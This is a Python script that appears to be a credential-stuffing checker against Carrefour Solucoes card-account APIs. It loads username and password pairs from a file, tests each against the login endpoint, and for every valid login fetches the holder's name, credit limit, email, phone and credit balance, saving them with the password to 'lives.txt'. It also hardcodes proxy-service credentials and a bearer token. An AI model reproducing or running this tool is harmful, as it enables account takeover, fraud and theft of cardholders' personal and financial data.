import requests
import time
import json
import random
#from requests_debugger import requests
from termcolor import colored
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

USERNAME = 'deboracristinaoliveira36.gmail.com'
PASSWORD = 'zsancb'





def extrair_dados(usuario,access_token):
    cfg_proxy = f'http://{USERNAME}:{PASSWORD}gate2.proxyfuel.com:2000'
    url_cad = 'https://apis.carrefoursolucoes.com.br/cliente-cartao/api/clientes/'+ usuario +'/contas'
    cabecalho = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
        'referer': 'https://app.carrefoursolucoes.com.br/',
        'origin': 'https://app.carrefoursolucoes.com.br',
        'accept-language': 'pt-BR,en-US;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'authorization': 'Bearer '+ access_token,
        'accept':'application/json, text/plain, */*'
    }
    #proxies={'http': cfg_proxy, 'https': cfg_proxy},
    resp_cadastro = requests.get(url_cad, headers=cabecalho,  timeout=15)
    resp_cadjson = json.loads(resp_cadastro.text)
    return resp_cadjson

def extrair_fatura(usuario,access_token):
    cfg_proxy = f'http://{USERNAME}:{PASSWORD}gate2.proxyfuel.com:2000'
    url_fat = 'https://apis.carrefoursolucoes.com.br/cliente-cartao/api/contas/'+ usuario +'/tipoEnvioFatura'
    cabecalho_fat = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
        'referer': 'https://app.carrefoursolucoes.com.br/',
        'origin': 'https://app.carrefoursolucoes.com.br',
        'accept-language': 'pt-BR,en-US;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'authorization': 'Bearer '+ access_token,
        'accept':'application/json, text/plain, */*'
    }
    #proxies={'http': cfg_proxy, 'https': cfg_proxy},
    resp_fatura = requests.get(url_fat, headers=cabecalho_fat,  timeout=15)
    resp_fatjson = json.loads(resp_fatura.text)
    return resp_fatjson

def extrair_credito(usuario,access_token):
    cfg_proxy = f'http://{USERNAME}:{PASSWORD}gate2.proxyfuel.com:2000'
    url_credito = 'https://apis.carrefoursolucoes.com.br/api-credito-pessoal-cartao/api/contas/'+ usuario +'/saldo?validarCrivo=true'
    cabecalho_credito = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
        'referer': 'https://app.carrefoursolucoes.com.br/',
        'origin': 'https://app.carrefoursolucoes.com.br',
        'accept-language': 'pt-BR,en-US;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'authorization': 'Bearer '+ access_token,
        'accept':'application/json, text/plain, */*'
    }
    #proxies={'http': cfg_proxy, 'https': cfg_proxy},
    resp_credito = requests.get(url_credito, headers=cabecalho_credito,  timeout=15)
    resp_credjson = json.loads(resp_credito.text)
    return resp_credjson    

def checar(dados_checar):
    while(True):
        proxy = f'http://{USERNAME}:{PASSWORD}gate2.proxyfuel.com:2000'
        dados_db = dados_checar.replace("\n","").split("|")
        print(colored('TESTING... ---> {0}', 'yellow').format(dados_db)) 
        url = 'https://apis.carrefoursolucoes.com.br/idp/clientes/nativo/csf'
        post_dados = 'username=' + dados_db[0] + '&password=' + dados_db[1] + '&client_id=pwa_cartao_carrefour&grant_type=password'
        cabecalho = {
            'agent': 'Android;7.1.2;SM-G935F;samsung;4.0.3',
            'user-agent': 'okhttp/4.9.0',
            'accept-encoding': 'gzip',
            'Content-Type': 'application/x-www-form-urlencoded',
            'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJQdHFvZ1hxUVRGSHNVZGdzLXpibTZVUjEtUHY5ZGtMbVcxd3FMYjU2XzZjIn0.eyJqdGkiOiIxZTNjNWQ5Zi02NWM1LTQxNWItOGM2Yy02NjI2NDVhZDQ1NWUiLCJleHAiOjE2MzA5NzU2ODAsIm5iZiI6MCwiaWF0IjoxNjMwOTczODgwLCJpc3MiOiJodHRwczovL2tleWNsb2FrLmNzZmNwdi53Y29ycC5jYXJyZWZvdXIuY29tL2F1dGgvcmVhbG1zL0NTRi1DYW5haXMtRGlnaXRhaXMtTmFvLUxvZ2FkbyIsInN1YiI6ImFmNTU0YzNhLTdmZDUtNDhiMy04MGMxLWJkMWM1OWY3N2UzZiIsInR5cCI6IkJlYXJlciIsImF6cCI6InB3YV9jYXJ0YW9fY2FycmVmb3VyIiwiYXV0aF90aW1lIjowLCJzZXNzaW9uX3N0YXRlIjoiYmEyZDY3YzYtMTVhNS00MDM1LWFlZGMtNTllYmJjZmZiMTEyIiwiYWNyIjoiMSIsInNjb3BlIjoiIiwiY2xpZW50SWQiOiJwd2FfY2FydGFvX2NhcnJlZm91ciIsImNsaWVudEhvc3QiOiIxOTEuMjQ1Ljc5LjE2MCIsImlkX2VtcHJlc2EiOiIxIiwiY2xpZW50QWRkcmVzcyI6IjE5MS4yNDUuNzkuMTYwIn0.I2pPBfkOEtwaaIiNlYQolS1XYOTEOGnVrHUfcfy05ggjN54Uy5u83Gv72Du-xr6JUnEWnoGX4c2lzhLO2fKd21IvXDTMz-ObH_rc1yDOZWC3FLHiggzuqhds_MEjNw4wz5DmIMviJ-Fwhz0L7W0uwBUYokRn2KUdP96wjkmpUDjrUm8H3WppagC37IMheJehVvbHShW9PX1KniKfFjC2SE6cSMzTvH_b-ipoL-oo3jZxfFu6u3P_BdN5Ed4bBRSJHWRKDjc4I1pR1GezV0BrxuOHg2mumqTT5aghcTFl5A65mOzxO_5cha0-OVrBy8UYAuPfK3yq2tNGrTO7wxoIYg'
        }
        #, proxies={'http': proxy, 'https': proxy}
        response = requests.post(url, headers=cabecalho, data=post_dados, timeout=15)
        print(response.status_code)
        print(response.text)
        if (str(response.status_code) == '401'):
            print(colored('DIE ---> {0}', 'red').format(dados_db[0]+':|:'+dados_db[1]))
            break
        elif response.status_code == 200:
            resp_json = json.loads(response.text)
            salvar_validos(resp_json['access_token'])
            dados_usuario = extrair_dados(dados_db[0], resp_json['access_token'])

            nomeCompleto = dados_usuario['identificacaoCliente']['nomeTitular']
            limiteDisponivel = dados_usuario['identificacaoCliente']['contas'][0]['limiteDisponivel']['valor']

            dados_usuario_fat = extrair_fatura(dados_usuario['identificacaoCliente']['contas'][0]['numeroConta'], resp_json['access_token'])

            ddd_usuario = dados_usuario_fat['dadosTipoEnvioFatura']['celularSeguro']['ddd']
            tel_usuario = dados_usuario_fat['dadosTipoEnvioFatura']['celularSeguro']['numero']
            email_usuario = dados_usuario_fat['dadosTipoEnvioFatura']['email']
            
            dados_usuario_credito = extrair_credito(dados_usuario['identificacaoCliente']['contas'][0]['numeroConta'], resp_json['access_token'])

            saldo_credito = dados_usuario_credito['saldoDisponivel']['valor']

            print(colored('LIVE ---> {0}', 'green').format(dados_db[0]+':|:'+dados_db[1]+':|:'+str(nomeCompleto)+':|:'+str(limiteDisponivel)+':|:'+str(email_usuario)+':|:('+str(ddd_usuario)+') '+ str(tel_usuario)+':|:'+str(saldo_credito)))
            
            salvar_validos(dados_db[0]+':|:'+dados_db[1]+':|:'+str(nomeCompleto)+':|:'+str(limiteDisponivel)+':|:'+str(email_usuario)+':|:('+str(ddd_usuario)+') '+ str(tel_usuario)+':|:'+str(saldo_credito))
            break
        else:
            print(colored('ERROR MUITO LOKO ---> {0}', 'red').format(dados_db[0]+':|:'+dados_db[1]))
            break
        break
        

    
def salvar_validos(entrada):
    with open('lives.txt', 'a+') as fs:
        fs.write(entrada+'\n')
        

def testar(cache_dados):
    # Threading
    start_time = time.time() 
    with ThreadPoolExecutor(max_workers=1) as executor:
    	executor.map(checar, cache_dados)
    duration = time.time() - start_time
    print(f"Dados Testadas {len(cache_dados)} em {duration} segundos")


if (__name__ == "__main__"):
    arquivo_database = open("database.txt", encoding="utf-8", mode="r")
    database_memoria = arquivo_database.readlines()
    testar(database_memoria)
    
